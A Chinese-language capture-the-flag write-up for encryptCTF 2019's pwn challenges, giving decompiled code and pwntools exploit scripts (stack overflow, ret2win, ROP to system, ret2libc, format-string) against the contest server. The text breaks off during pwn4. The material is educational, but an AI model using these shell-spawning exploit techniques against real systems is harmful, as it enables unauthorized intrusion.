# encryptCTF2019 pwn&web
周中跟着大佬们打了一场国外的CTF，题目不是很难，不过很适合新人练练手。其中我AK了pwn和web的题目，pwn题难度较低，对我这些萌新十分友好，web带点脑洞，其中两题python站的题目还是不错的，可以借此熟悉一下`virtualenv`的操作和`ssti`注入。
## pwn
### pwn0
    [*] '/home/kira/pwn/encryptCTF/pwn0'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+1Ch] [ebp-44h]
      char s1; // [esp+5Ch] [ebp-4h]
      setvbuf(stdout, 0, 2, 0);
      puts("How's the josh?");
      gets(&s);
      if ( !memcmp(&s1, "H!gh", 4u) )
      {
        puts("Good! here's the flag");
        print_flag();
      }
      else
      {
        puts("Your josh is low!\nBye!");
      }
      return 0;
    }
思路：只要`s1`内容为`H!hg`即可getflag，那么直接在输入`s`的时候溢出覆盖`s1`就行了。
    # kira @ k1r4 in ~/pwn/encryptCTF on git:master x [14:04:34]
    $ nc 104.154.106.182 1234
    How's the josh?
    H!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!ghH!gh
    Good! here's the flag
    encryptCTF{L3t5_R4!53_7h3_J05H}
### pwn1
    [*] '/home/kira/pwn/encryptCTF/pwn1'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+10h] [ebp-80h]
      setvbuf(stdout, 0, 2, 0);
      printf("Tell me your name: ");
      gets(&s);
      printf("Hello, %s\n", &s);
      return 0;
    }
思路：程序没开canary，自带getshell的后门函数，直接栈溢出覆盖ret地址即可。
    from pwn import *
    p = remote('104.154.106.182', 2345)
    p.sendline('a'*140+p32(0x80484AD))
    p.interactive()
### pwn2
    [*] '/home/kira/pwn/encryptCTF/pwn2'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+10h] [ebp-20h]
      setvbuf(stdout, 0, 2, 0);
      printf("$ ");
      gets(&s);
      if ( !strcmp(&s, "ls") )
        run_command_ls();
      else
        printf("bash: command not found: %s\n", &s);
      puts("Bye!");
      return 0;
    }
思路：题目里面自带`system`，直接栈溢出组ROP。先用`gets`读入`/bin/sh`，然后调用`system`。
    from pwn import *
    elf = ELF('./pwn2')
    p = remote('104.154.106.182', 3456)
    pr = 0x08048546 # pop ebp ; ret
    bss = 0x0804A040
    payload = p32(elf.plt['gets'])+p32(pr)+p32(bss)+p32(elf.plt['system'])+p32(0)+p32(bss)
    p.sendlineafter('$ ','a'*44+payload)
    p.sendline('/bin/sh\x00')
    p.interactive()
### pwn3
    [*] '/home/kira/pwn/encryptCTF/pwn3'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+10h] [ebp-80h]
      setvbuf(stdout, 0, 2, 0);
      puts("I am hungry you have to feed me to win this challenge...\n");
      puts("Now give me some sweet desert: ");
      gets(&s);
      return 0;
    }
思路：这次程序没有`system`函数，需要泄露libc地址，然后ret2libc，远程泄露`gets`地址最低三位是`e60`，可以查到libc版本为`libc6_2.19-0ubuntu6.14_i386`。首先构造一个ROP来泄露libc地址，然后返回`main`函数，这里有个坑点是第二次溢出需要填充的垃圾字符数量不一样，具体可以调试看看，然后再组一次ROP，调用`system`。
    from pwn import *
    libc = ELF('./libc6_2.19-0ubuntu6.14_i386.so')
    elf = ELF('./pwn3')
    p = remote('104.154.106.182', 4567)
    main = 0x0804847D
    p.sendlineafter(': \n','a'*140+p32(elf.plt['puts'])+p32(main)+p32(elf.got['gets']))
    libc.address = u32(p.recv(4)) - libc.sym['gets']
    print hex(libc.address)
    p.sendlineafter(': \n','a'*132+p32(libc.sym['system'])+p32(0)+p32(libc.search('/bin/sh').next()))
    p.interactive()
### pwn4
    [*] '/home/kira/pwn/encryptCTF/pwn4'
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+1Ch] [ebp-84h]
      unsigned int v5; // [esp+9Ch] [ebp-4h]
      v5 = __readgsdword(0x14u);
      setvbuf(stdout, 0, 2, 0);
      puts("Do you swear to use this shell with responsility by the old gods and the new?\n");
      gets(&s);
      printf(&s);
      printf("\ni don't belive you!\n%s\n", &s);
      return 0;
    }
思路：题目开了canary，不能直接进行栈溢出。有一个很明显的格式化字符串漏洞，而且程序自带一个getshell的后门，可以用格式化字符串修改`PI:EMAIL`为后门函数。
    # kira @ k1r4 in ~/pwn/encryptCTF on git:master x [19:33:56]
    $ ./pwn4
    Do you swear to use this shell with responsility by the old gods and the new?
    aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p